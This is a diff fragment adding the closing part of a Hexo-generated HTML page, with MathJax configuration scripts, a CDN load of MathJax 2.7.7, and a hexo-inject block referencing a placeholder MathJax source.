+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
